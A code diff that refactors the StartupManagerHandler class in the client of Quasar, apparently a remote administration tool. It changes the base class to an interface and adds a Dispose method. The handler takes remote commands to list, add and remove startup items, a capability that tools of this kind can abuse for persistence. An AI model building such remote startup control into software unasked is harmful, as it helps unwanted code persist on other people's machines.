@@ -12,19 +12,15 @@ using System.Linq;
 
 namespace Quasar.Client.Messages
 {
-    public class StartupManagerHandler : MessageProcessorBase<object>
+    public class StartupManagerHandler : IMessageProcessor
     {
-        public StartupManagerHandler() : base(false)
-        {
-        }
-
-        public override bool CanExecute(IMessage message) => message is GetStartupItems ||
+        public bool CanExecute(IMessage message) => message is GetStartupItems ||
                                                              message is DoStartupItemAdd ||
                                                              message is DoStartupItemRemove;
 
-        public override bool CanExecuteFrom(ISender sender) => true;
+        public bool CanExecuteFrom(ISender sender) => true;
 
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -285,7 +281,16 @@ namespace Quasar.Client.Messages
             }
         }
 
-        protected override void Dispose(bool disposing)
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// </summary>
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
         {
             
         }
